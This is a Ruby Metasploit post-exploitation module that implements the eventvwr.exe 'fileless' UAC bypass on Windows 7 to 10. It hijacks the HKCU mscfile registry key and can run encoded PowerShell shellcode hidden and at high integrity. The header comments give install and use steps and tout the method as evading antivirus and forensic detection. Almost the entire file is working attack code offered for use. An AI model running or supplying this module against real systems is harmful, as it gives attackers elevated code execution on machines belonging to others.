##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : enigma_fileless_uac_bypass.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : enigma0x3 | @mattifestation
# Tested on      : Windows 7 | Windows 8 | Windows 10
# POC: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking
#
#
#
# [ DESCRIPTION ]
# Most of the UAC bypass techniques require dropping a file to disk (for example, placing a DLL on disk
# to perform a DLL hijack). The technique used in this module differs from the other public methods and
# provides a useful new technique that does not rely on a privileged file copy, code injection, or placing
# a traditional file on disk.
#
# As a normal user, you have write access to keys in HKCU, if an elevated process interacts with keys you
# are able to manipulate you can potentially interfere with actions a high-integrity process is attempting
# to perform. (hijack the process being started), Due to the fact that I was able to hijack the process,
# it is possible to simply execute whatever malicious cmd.exe command you wish. This means that code execution
# has been achieved in a high integrity process (bypassing UAC) without dropping a DLL or other file down to
# the file system. This significantly reduces the risk to the attacker because they aren’t placing a traditional
# file on the file system that can be caught by AV/HIPS or forensically identified later.
# "This module differs from 'OJ msf module' because it uses cmd.exe insted of powershell.exe"
# "This module will not work if target UAC level its set to 'Always Notify' (non-default setting)"
#
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on     => set SESSION 3
# The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
# Check target vulnerability settings/status?  => set CHECK_VULN true
# Delete malicious registry hive keys/values?  => set DEL_REGKEY true
# Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
# ---
# HINT: To deploy a powershell payload (shellcode string) we need to set the option
# 'USE_POWERSHELL true' and input the powershell base64 encoded shellcode into 'EXEC_COMMAND'
# EXAMPLE: set USE_POWERSHELL true | set EXEC_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
# ---
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/enigma_fileless_uac_bypass
# msf post(enigma_fileless_uac_bypass) > info
# msf post(enigma_fileless_uac_bypass) > show options
# msf post(enigma_fileless_uac_bypass) > show advanced options
# msf post(enigma_fileless_uac_bypass) > set [option(s)]
# msf post(enigma_fileless_uac_bypass) > exploit
#
# [ HINT ]
# In some linux distributions postgresql need to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - /etc/init.d/postgresql start
# 2 - msfdb delete
# 3 - msfdb init
# 4 - msfconsole
# 5 - reload_all
##



# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'enigma fileless uac bypass [RCE]',
                        'Description'   => %q{
                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe (hijacking the process being started to gain code execution).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln dicover : enigma0x3 | mattifestation', # credits
                                ],
 
                        'Version'        => '$Revision: 1.4',
                        'DisclosureDate' => 'jan 5 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false', # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 | Windows 8 | Windows 10
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('EXEC_COMMAND', [ false, 'The cmd command to be executed (eg start notepad.exe)']),
                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                        ], self.class) 

        end




#TODO: check IF set use_powershell true works
#TODO: check IF #{comm_inje} has successefuly injected.
# -------------------------------------------------------
# GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
# -------------------------------------------------------
def ls_stage1

  r=''
  session = client
  vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
  regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
  psh_lpath = "%SystemRoot%\\System32\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
  psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['EXEC_COMMAND'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set EXEC_COMMAND option!")
    return nil
  else
    print_status("Hijacking eventvwr.exe process!")
    Rex::sleep(1.5)
  end

    # search in target regedit if eventvwr calls mmc.exe
    print_warning("Reading proccess registry hive keys...")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
      print_good(" Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command (mmc.exe call)")
       print_error("Post-module cant find the registry hive key needed...")
       print_error("System does not appear to be vulnerable to the exploit code!")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

    #
    # chose to execute a single command in cmd.exe syntax logic
    # or to execute a shellcode(base64) string using powershell.exe
    #
    if datastore['USE_POWERSHELL'] == true
      comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
    else
      comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
    end

 # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
 print_good(" Hijacking proccess to gain code execution...")
 r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit
 Rex::sleep(4.5)

      # start remote service to gain code execution
      print_good(" Starting eventvwr.exe native proccess...")
      r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
      Rex::sleep(1.0)

    # close channel when done
    print_status("Credits: enigma0x3 + @mattifestation")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




#TODO: check IF #{reg_clean} has sucessefuly deleted value
# ----------------------------------------------------
# DELETE MALICIOUS REGISTRY ENTRY (proccess hijacking)
# ----------------------------------------------------
def ls_stage2

  r=''
  session = client
  reg_clean = "REG DELETE HKCU\\Software\\Classes\\mscfile /f" # registry hive to be clean
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DEL_REGKEY'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DEL_REGKEY option!")
    return nil
  else
    print_status("Revert eventvwr.exe process hijack!")
    Rex::sleep(1.5)
  end

    # search in target regedit if hijacking method allready exists
    print_warning("Reading proccess registry hive keys...")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
      print_good(" Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_warning("Hive key: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
       print_error("Post-module cant find the registry hive key needed...")
       print_error("System does not appear to be vulnerable to the exploit code!")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

 # Delete hijacking hive keys from target regedit...
 # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
 print_good(" Deleting HKCU hive registry keys...")
 r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit
 Rex::sleep(3.0)

      # check if remote registry hive keys was deleted successefuly
      if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
        print_error("Module can not verifie if deletion has successefully!")
      else
        print_status("Registry hive keys deleted successefuly!")
      end

    Rex::sleep(1.0)
    # close channel when done
    print_status("process hijack reverted to default stage")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# -------------------------------------------
# CHECK TARGET VULNERABILITY STATUS/EXISTANCE
# -------------------------------------------
def ls_stage3

  r=''
  session = client
  vuln_soft = "eventvwr.exe"                         # vulnerable software name
  vuln_hive = "HKCR\\mscfile\\shell\\open\\command"  # vulnerable hive key call (mmc.exe)
  vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['CHECK_VULN'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set CHECK_VULN option!")
    return nil
  else
    print_status("Checking target vulnerability details!")
    Rex::sleep(1.5)
  end

    print_warning("Reading proccess registry hive keys...")
    Rex::sleep(1.0)
    # check target registry hive/key settings
    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
      report_on = "EXPLOITABLE"
    else
      vuln_hive = "NOT FOUND"
      report_on = "NOT EXPLOITABLE"
    end

    # check target registry hive/key settings
    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
      report_tw = "HIJACK HIVE PRESENT"
    else
      vuln_key = "NOT FOUND"
      report_tw = "HIJACK HIVE NOT PRESENT"
    end

  print_line("")
  # display target registry settings to user...
  print_line("VULNERABLE_SOFT : #{vuln_soft}")
  print_line("    VULN_HIVE   : #{vuln_hive}")
  print_line("    KEY_INFO    : #{report_on}")
  print_line("")
  print_line("    HIJACK_HIVE : #{vuln_key}")
  print_line("    KEY_INFO    : #{report_tw}")
  print_line("")
Rex::sleep(0.5)
end




# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    | enigma fileless UAC bypass command execution |")
    print_line("    |             Author: r00t-3xp10it             |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    # check for proper session (meterpreter)
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['EXEC_COMMAND']
         ls_stage1
      end

      if datastore['DEL_REGKEY']
         ls_stage2
      end

      if datastore['CHECK_VULN']
         ls_stage3
      end
   end
end
